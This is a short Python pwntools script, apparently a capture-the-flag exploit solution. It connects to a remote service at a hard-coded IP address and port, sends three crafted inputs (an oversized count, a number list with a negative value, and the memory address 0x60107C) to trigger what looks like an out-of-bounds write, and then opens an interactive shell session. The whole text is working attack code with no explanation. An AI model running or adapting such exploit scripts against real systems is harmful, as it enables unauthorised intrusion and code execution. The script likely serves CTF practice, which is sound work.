from pwn import *

ip = "140.110.112.77"
port = 2117

r = remote(ip, port)
# r = process("./binary")

r.sendlineafter("1", "1048577")
r.sendlineafter("2", "100 256 -87117812")
r.sendlineafter("3", str(0x60107C))

r.interactive()
